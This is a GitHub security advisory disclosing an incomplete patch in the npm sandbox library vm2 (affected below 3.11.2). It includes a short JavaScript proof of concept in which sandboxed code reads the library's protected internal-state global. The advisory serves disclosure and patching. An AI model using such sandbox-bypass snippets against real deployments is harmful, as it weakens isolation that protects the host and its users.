# [M] vm2 has access to `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL`

## Summary
Severity: Medium
Advisory: GHSA-2cm2-m3w5-gp2f
CWE: CWE-693
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-2cm2-m3w5-gp2f
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.2

## Details
### Summary

https://github.com/patriksimek/vm2/security/advisories/GHSA-wp5r-2gw5-m7q7 is not fully patched.

### Details

It is still possible to get access to `VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL`.

### PoC

```js
const {VM} = require("vm2");
const vm = new VM();
console.log(vm.run(`
 globalThis['VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL']
`));
```

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-2cm2-m3w5-gp2f
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.2
